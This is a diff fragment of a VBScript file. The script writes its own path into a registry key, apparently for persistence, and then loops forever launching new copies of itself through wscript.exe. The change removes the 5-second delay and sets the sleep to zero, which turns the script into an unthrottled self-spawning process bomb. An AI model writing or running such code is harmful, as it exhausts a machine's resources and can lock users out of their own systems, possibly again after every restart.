@@ -12,6 +12,5 @@ objShell.RegWrite regKey, scriptPath, "REG_SZ"
 Do
     objShell.Run "wscript.exe " & scriptPath, 1, False
     
-    ' Adjust the delay time (in milliseconds) between each loop iteration
-    WScript.Sleep 5000 ' 5 seconds delay
+    WScript.Sleep 0
 Loop
